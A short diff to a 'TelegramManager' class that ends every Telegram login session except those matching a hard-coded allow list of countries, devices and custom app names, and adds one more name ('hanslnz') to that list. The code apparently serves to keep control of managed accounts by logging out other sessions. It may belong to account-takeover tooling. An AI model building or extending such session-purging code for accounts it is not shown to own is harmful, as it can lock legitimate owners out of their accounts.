@@ -213,8 +213,8 @@ class TelegramManager {
             if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                 auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                 auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
-                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
-                || auth.deviceModel.toLowerCase().includes('windows')) {
+                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
+                auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows')) {
                 return auth;
             } else {
                 this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
@@ -497,6 +497,7 @@ class TelegramManager {
         let latest = 0
         result.authorizations.map((auth) => {
             if (!auth.country.toLowerCase().includes('singapore') && !auth.deviceModel.includes("Windows")
+                && !auth.appName.toLowerCase().includes("hanslnz")
                 // && !contains(auth.apiId?.toString() || "default",
                 //     ["27919939", "25328268", "24559917", "12777557", "27565391", "23195238"]
                 // )
@@ -781,7 +782,7 @@ class TelegramManager {
             throw error
         }
     }
-    
+
     async hasPassword() {
         const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
         return passwordInfo.hasPassword
